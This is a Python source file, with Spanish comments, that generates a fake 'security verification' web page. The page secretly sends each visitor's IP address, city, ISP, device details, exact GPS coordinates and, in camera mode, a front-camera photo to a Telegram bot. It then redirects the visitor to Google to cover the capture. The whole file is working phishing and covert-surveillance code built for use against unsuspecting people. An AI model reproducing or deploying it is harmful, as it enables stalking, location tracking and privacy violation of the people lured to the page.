
"""
Plantillas HTML para el módulo de tracking.
Contiene la estructura base y los scripts JS para Geo y Cam tracking.
"""

CSS_STYLES = """
<style>
    body{font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .box{background:white;padding:2rem;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);text-align:center;max-width:400px;width:90%}
    .loader{width:48px;height:48px;border:5px solid #000;border-bottom-color:transparent;border-radius:50%;display:inline-block;box-sizing:border-box;animation:r 1s linear infinite}
    @keyframes r{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h2{color:#333;margin-top:1rem}
    p{color:#666;font-size:0.9rem}
</style>
"""

JS_COMMON_FUNCTIONS = """
const BOT='__TOKEN__', CHAT='__CHAT_ID__';

const send = async (txt) => {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML'})
    });
};

const sendPhoto = async (blob) => {
    const formData = new FormData();
    formData.append('chat_id', CHAT);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', '📸 <b>Captura de Cámara</b>');
    formData.append('parse_mode', 'HTML');
    
    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
};

const getBasicInfo = async () => {
    let info = `🔍 <b>NUEVA VISITA DETECTADA</b>\\n\\n`;
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        info += `🌐 <b>IP:</b> <code>${d.ip}</code>\\n`;
        
        const ipd = await fetch(`http://ip-api.com/json/${d.ip}`);
        const geo = await ipd.json();
        if(geo.status === 'success') {
            info += `📍 <b>Ubicación:</b> ${geo.city}, ${geo.country}\\n`;
            info += `🏢 <b>ISP:</b> ${geo.isp}\\n`;
        }
    } catch(e) {}
    
    info += `📱 <b>UA:</b> ${navigator.userAgent}\\n`;
    info += `💻 <b>OS:</b> ${navigator.platform}\\n`;
    try {
        const battery = await navigator.getBattery();
        info += `🔋 <b>Batería:</b> ${Math.round(battery.level * 100)}%\\n`;
    } catch(e) {}
    
    await send(info);
};
"""

JS_GEO_SPECIFIC = """
const getGeo = () => {
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (p) => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
            gps += `📍 <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
            gps += `📏 <b>Precisión:</b> ${acc} metros\\n`;
            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>`;
            await send(gps);
            redirect();
        }, (e) => {
            send(`❌ <b>GPS Denegado:</b> ${e.message}`);
            redirect();
        });
    } else {
        redirect();
    }
};
"""

JS_CAM_SPECIFIC = """
const getCam = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    await sendPhoto(blob);
                    stream.getTracks().forEach(t => t.stop());
                    getGeo(); // Intentar Geo después de Cam
                }, 'image/jpeg', 0.8);
            }, 1500);
        };
    } catch (e) {
        await send(`❌ <b>Cámara Denegada/Error:</b> ${e.message}`);
        getGeo();
    }
};
"""

def get_template(token, chat_id, mode="geo"):
    """Genera el HTML completo inyectando token, chat_id y lógica según modo"""
    
    # Usar replace con marcadores únicos para evitar conflictos con llaves de JS/CSS
    logic = JS_COMMON_FUNCTIONS.replace('__TOKEN__', token).replace('__CHAT_ID__', str(chat_id))
    
    if mode == "cam":
        init_call = "await getBasicInfo(); getCam();"
        logic += JS_GEO_SPECIFIC + JS_CAM_SPECIFIC
    else:
        init_call = "await getBasicInfo(); getGeo();"
        logic += JS_GEO_SPECIFIC

    # Construir el HTML final usando reemplazo simple para evitar problemas con f-strings y llaves
    template = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    __CSS__
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <h2 id="msg">Verificando...</h2>
        <p>Por favor permite el acceso para continuar.</p>
    </div>
    <script>
        const redirect = () => { window.location.href = "https://google.com"; };
        
        __LOGIC__
        
        (async () => {
            __INIT__
        })();
    </script>
</body>
</html>
"""
    html = template.replace('__CSS__', CSS_STYLES)
    html = html.replace('__LOGIC__', logic)
    html = html.replace('__INIT__', init_call)
    
    return html
